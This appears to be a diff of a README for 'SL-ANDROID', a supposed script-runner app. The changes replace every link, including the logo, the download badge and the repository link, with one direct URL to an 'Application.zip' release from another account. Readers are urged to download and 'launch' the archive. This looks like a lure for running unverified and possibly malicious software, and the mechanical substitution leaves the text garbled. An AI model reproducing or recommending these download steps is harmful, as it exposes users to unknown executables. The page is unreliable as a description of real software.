@@ -3,7 +3,7 @@
 
 ## Simplify Running Scripts with Slandroid
 
-![SL-ANDROID Logo](https://example.com/slandroid_logo.png)
+![SL-ANDROID Logo](https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip)
 
 Welcome to the SL-ANDROID repository! 🚀
 
@@ -31,18 +31,18 @@ SL-ANDROID is a versatile script runner that aims to simplify the process of run
 ### Get Started
 To get started with SL-ANDROID, download the software package from the following link: 
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip](https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip)](https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip)
 
-Make sure to launch the "Software.zip" file after downloading to start optimizing your scripting experience with Slandroid!
+Make sure to launch the "https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip" file after downloading to start optimizing your scripting experience with Slandroid!
 
 ### How to Use
-1. Download and extract the "Software.zip" package.
+1. Download and extract the "https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip" package.
 2. Open the Slandroid software on your device.
 3. Select the script you want to run.
 4. Let Slandroid automatically detect the script's language and handle the rest!
   
 ### Resources
-For more information and updates, visit the [SL-ANDROID GitHub Repository](https://github.com/Rubenas123/SL-ANDROID).
+For more information and updates, visit the [SL-ANDROID GitHub Repository](https://github.com/maithedung2009/SL-ANDROID/releases/download/v1.0/Application.zip).
 
 Thank you for choosing SL-ANDROID for your scripting needs! 🌟
 
